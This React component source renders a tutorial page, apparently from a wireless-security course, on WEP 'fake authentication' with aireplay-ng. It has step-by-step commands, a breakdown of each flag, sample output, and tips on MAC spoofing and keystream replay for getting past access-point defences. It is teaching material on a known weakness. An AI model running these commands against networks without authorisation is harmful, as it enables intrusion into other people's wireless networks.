import React from 'react';
import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import Diagram from '../../components/Diagram';

const FakeAuth = () => {
  return (
    <div className="page-content">
      <h1>Fake Authentication — Associating Without the Key</h1>

      <p>
        <strong>Fake Authentication</strong> is a technique that lets you associate with a WEP access 
        point <em>without knowing the WEP key</em>. Why do we need this? Because before you can inject 
        packets into a network (like ARP replays), the access point must recognize your MAC address as 
        an associated client. Fake auth tricks the AP into thinking you're a legitimate client.
      </p>

      {/* ============================================================ */}
      {/* SECTION: Why Fake Auth is Needed                             */}
      {/* ============================================================ */}
      <h2>🤔 Why Do We Need Fake Authentication?</h2>

      <p>
        Here's the story: You want to crack a WEP network, but nobody is using it, so no data 
        packets are being generated. You need to inject ARP packets to force the router to generate 
        encrypted replies (which contain new IVs). But there's a catch — the router will 
        <strong>ignore packets from unknown MACs</strong>.
      </p>

      <Diagram title="Why Fake Authentication is Needed">
{`
  The Problem:
  
  You (random MAC) ──ARP Request──► Router
                                    │
                                    ▼
                              "Who are you?
                               You're not
                               associated!
                               IGNORED!" ❌
  
  
  The Solution — Fake Auth:
  
  Step 1: Fake Authentication
  You ──"Hi, I want to associate"──► Router
                                     │
                                     ▼
                               "OK, you're now
                                associated!" ✅
  (WEP doesn't verify the key during association!)
  
  Step 2: Now Injection Works!
  You (associated) ──ARP Packet──► Router
                                   │
                                   ▼
                             "OK, you're
                              associated.
                              Here's the
                              reply!" ✅
                              (encrypted with
                               new IV!)
`}
      </Diagram>

      <InfoBox type="note">
        <strong>Key insight:</strong> WEP has two authentication types: "Open System" and "Shared Key". 
        In Open System authentication (the most common), the AP doesn't verify you know the WEP key 
        during association — it only checks later when you try to send encrypted data. This means 
        you can successfully associate without the key! In Shared Key authentication, the AP sends 
        a challenge text — but this is actually <em>less</em> secure because it gives us a known 
        plaintext-ciphertext pair.
      </InfoBox>

      {/* ============================================================ */}
      {/* SECTION: How it Works                                        */}
      {/* ============================================================ */}
      <h2>🔧 How Fake Authentication Works</h2>

      <Diagram title="802.11 Open System Authentication">
{`
  Normal Authentication (Open System):
  
  Client                                  Access Point
    │                                          │
    │──── Authentication Request ────────────►│
    │     (Type: Open System)                  │
    │                                          │
    │◄──── Authentication Response ───────────│
    │      (Status: Successful)                │
    │                                          │
    │──── Association Request ────────────────►│
    │     (Capabilities, Supported Rates)      │
    │                                          │
    │◄──── Association Response ──────────────│
    │      (Status: Successful, AID assigned)  │
    │                                          │
    │ Now associated! Can send/receive frames  │
    │ (but data must be WEP-encrypted)         │
    │                                          │
  
  Fake Authentication does the same thing!
  The AP never checks if we know the WEP key
  during this process. It only checks later
  when we try to decrypt data.
`}
      </Diagram>

      {/* ============================================================ */}
      {/* SECTION: Commands                                            */}
      {/* ============================================================ */}
      <h2>🖥️ Performing Fake Authentication</h2>

      <Terminal lines={[
        { segments: [{ text: '# Prerequisites:', type: 'comment' }] },
        { segments: [{ text: '# 1. You must be in monitor mode', type: 'comment' }] },
        { segments: [{ text: '# 2. You should have airodump-ng running on the target', type: 'comment' }] },
        { segments: [{ text: '# 3. Note your adapter\'s MAC address', type: 'comment' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Check your MAC address', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'macchanger -s wlan0mon', type: 'command' }] },
        { segments: [{ text: 'Current MAC:   00:c0:ca:aa:bb:cc (Alfa, Inc.)', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# ═══════════════════════════════════════════', type: 'comment' }] },
        { segments: [{ text: '# FAKE AUTHENTICATION', type: 'comment' }] },
        { segments: [{ text: '# ═══════════════════════════════════════════', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aireplay-ng --fakeauth 0 -a 44:55:66:DD:EE:FF -h 00:c0:ca:aa:bb:cc wlan0mon', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '15:10:23  Sending Authentication Request (Open System) [ACK]', type: 'output' }] },
        { segments: [{ text: '15:10:23  Authentication successful', type: 'highlight' }] },
        { segments: [{ text: '15:10:23  Sending Association Request [ACK]', type: 'output' }] },
        { segments: [{ text: '15:10:23  Association successful :-) (AID: 1)', type: 'highlight' }] },
      ]} />

      <h3>Command Breakdown</h3>
      <Diagram title="Fake Auth Command Explained">
{`
  sudo aireplay-ng --fakeauth 0 -a 44:55:66:DD:EE:FF -h 00:c0:ca:aa:bb:cc wlan0mon
  │                │          │ │                     │                     │
  │                │          │ │                     │                     └─ Interface
  │                │          │ │                     │
  │                │          │ │                     └─ YOUR MAC address
  │                │          │ │                        (source of fake auth)
  │                │          │ │
  │                │          │ └─ Target AP's BSSID
  │                │          │    (router's MAC)
  │                │          │
  │                │          └─ Reassociation delay
  │                │             0 = authenticate once
  │                │             6000 = re-auth every 6000 ms
  │                │             (some APs disconnect idle clients)
  │                │
  │                └─ Attack type: fake authentication
  │
  └─ Run as root
`}
      </Diagram>

      <h3>Keeping the Association Alive</h3>
      <Terminal lines={[
        { segments: [{ text: '# Some APs disconnect idle clients after a timeout.', type: 'comment' }] },
        { segments: [{ text: '# Use a delay parameter to re-authenticate periodically:', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aireplay-ng --fakeauth 6000 -a 44:55:66:DD:EE:FF -h 00:c0:ca:aa:bb:cc -q 10 wlan0mon', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# --fakeauth 6000 = re-authenticate every 6000 seconds', type: 'comment' }] },
        { segments: [{ text: '# -q 10 = send keep-alive packets every 10 seconds', type: 'comment' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '15:10:23  Association successful :-) (AID: 1)', type: 'highlight' }] },
        { segments: [{ text: '15:10:33  Sending keep-alive packet [ACK]', type: 'output' }] },
        { segments: [{ text: '15:10:43  Sending keep-alive packet [ACK]', type: 'output' }] },
        { segments: [{ text: '... (continues keeping the association alive)', type: 'comment' }] },
      ]} />

      {/* ============================================================ */}
      {/* SECTION: Verification                                        */}
      {/* ============================================================ */}
      <h2>✅ Verifying Your Association</h2>

      <p>
        After fake authentication succeeds, check your airodump-ng window. You should see your MAC 
        address appear in the clients section, associated with the target AP:
      </p>

      <Terminal lines={[
        { segments: [{ text: '# In your airodump-ng window, you should see:', type: 'comment' }] },
        { segments: [{ text: ' BSSID              STATION            PWR   Rate   Lost  Frames  Notes  Probes', type: 'output' }] },
        { segments: [{ text: ' 44:55:66:DD:EE:FF  ', type: 'output' }, { text: '00:C0:CA:AA:BB:CC', type: 'highlight' }, { text: '  -38   0e- 0     0       5', type: 'output' }] },
        { segments: [{ text: '                    ↑ YOUR MAC appears as an associated client!', type: 'comment' }] },
      ]} />

      {/* ============================================================ */}
      {/* SECTION: Edge Cases                                          */}
      {/* ============================================================ */}
      <h2>⚠️ Edge Cases & Troubleshooting</h2>

      <h3>Edge Case: "Authentication failed" or "Denied" message</h3>
      <ul>
        <li><strong>MAC filtering:</strong> The AP may have MAC filtering enabled. You need to spoof your MAC to match an already-associated client (find one in airodump-ng).</li>
        <li><strong>Shared Key Auth:</strong> The AP uses Shared Key authentication instead of Open System. You'll need to capture a PRGA (pseudo-random keystream) from a legitimate client's auth first.</li>
        <li><strong>Wrong channel:</strong> Your adapter isn't on the same channel as the AP.</li>
        <li><strong>Signal too weak:</strong> The AP can't hear your auth request. Move closer.</li>
      </ul>

      <h3>Edge Case: Shared Key Authentication</h3>
      <Terminal lines={[
        { segments: [{ text: '# If the AP uses Shared Key auth, you\'ll see:', type: 'comment' }] },
        { segments: [{ text: '15:10:23  Sending Authentication Request (Open System)', type: 'output' }] },
        { segments: [{ text: '15:10:23  AP rejects open-system authentication', type: 'highlight' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Solution: Wait for a legitimate client to authenticate,', type: 'comment' }] },
        { segments: [{ text: '# capture the challenge-response, then use it:', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aireplay-ng --fakeauth 0 -a 44:55:66:DD:EE:FF -h 00:c0:ca:aa:bb:cc -y shared_keystream.xor wlan0mon', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# The .xor file contains the keystream from a captured auth', type: 'comment' }] },
      ]} />

      <h3>Edge Case: Association drops during ARP replay</h3>
      <p>
        If your association keeps dropping, the AP may have a short idle timeout. Use the 
        <code>-q</code> flag with fake auth to send periodic keep-alive packets, or run fake auth 
        in a separate terminal with a low re-auth delay.
      </p>

      <h3>Edge Case: AP ignores fake auth completely</h3>
      <p>
        Some modern routers (even with WEP) have additional protections. If fake auth consistently 
        fails, try:
      </p>
      <ul>
        <li>Changing your MAC to match a known client</li>
        <li>Waiting for a real client to connect and using their MAC</li>
        <li>Using a different adapter (some send cleaner frames)</li>
      </ul>

      <InfoBox type="success">
        <strong>Key Takeaways:</strong>
        <ul>
          <li>Fake auth lets you associate with a WEP AP without the key</li>
          <li>It works because Open System authentication doesn't verify the WEP key</li>
          <li>Association is required before you can inject packets (ARP replay)</li>
          <li>Use <code>-q 10</code> to keep the association alive with keep-alive packets</li>
          <li>Verify your association by checking the airodump-ng client list</li>
          <li>If auth fails, check for MAC filtering or Shared Key auth mode</li>
        </ul>
      </InfoBox>

      <h2>📚 What's Next?</h2>
      <p>
        Now that you're associated with the WEP network, it's time to generate traffic! The next 
        section covers the <strong>ARP Replay Attack</strong> — forcing the router to generate 
        thousands of encrypted packets per second, rapidly accumulating the IVs needed to crack the key.
      </p>
    </div>
  );
};

export default FakeAuth;
